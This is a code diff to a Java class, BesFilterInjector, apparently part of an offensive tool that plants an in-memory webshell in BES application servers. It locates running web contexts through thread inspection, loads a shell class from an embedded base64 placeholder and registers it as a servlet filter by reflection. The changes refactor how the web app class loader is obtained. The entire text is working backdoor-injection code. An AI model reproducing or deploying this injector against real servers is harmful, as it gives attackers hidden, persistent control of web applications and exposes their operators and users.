@@ -45,6 +45,10 @@ public class BesFilterInjector {
         return "{{base64Str}}";
     }
 
+    /**
+     * com.bes.enterprise.webtier.core.DefaultContext
+     * /opt/bes/lib/bes-engine.jar
+     */
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
@@ -54,21 +58,25 @@ public class BesFilterInjector {
                 Collection<?> values = childrenMap.values();
                 for (Object value : values) {
                     Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    for (Object context : children.values()) {
-                        contexts.add(context);
-                    }
+                    contexts.addAll(children.values());
                 }
             }
         }
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -87,8 +95,9 @@ public class BesFilterInjector {
             log.warning("filter already exists");
             return;
         }
-        Object filterDef = context.getClass().getClassLoader().loadClass("com.bes.enterprise.web.util.descriptor.web.FilterDef").newInstance();
-        Object filterMap = context.getClass().getClassLoader().loadClass("com.bes.enterprise.web.util.descriptor.web.FilterMap").newInstance();
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Object filterDef = contextClassLoader.loadClass("com.bes.enterprise.web.util.descriptor.web.FilterDef").newInstance();
+        Object filterMap = contextClassLoader.loadClass("com.bes.enterprise.web.util.descriptor.web.FilterMap").newInstance();
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
         invokeMethod(filterDef, "setFilter", new Class[]{Filter.class}, new Object[]{filter});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
@@ -100,7 +109,7 @@ public class BesFilterInjector {
             invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         }
 
-        Constructor<?>[] constructors = context.getClass().getClassLoader().loadClass("com.bes.enterprise.webtier.core.ApplicationFilterConfig").getDeclaredConstructors();
+        Constructor<?>[] constructors = contextClassLoader.loadClass("com.bes.enterprise.webtier.core.ApplicationFilterConfig").getDeclaredConstructors();
         constructors[0].setAccessible(true);
         Object filterConfig = constructors[0].newInstance(context, filterDef);
         HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFieldValue(context, "filterConfigs");
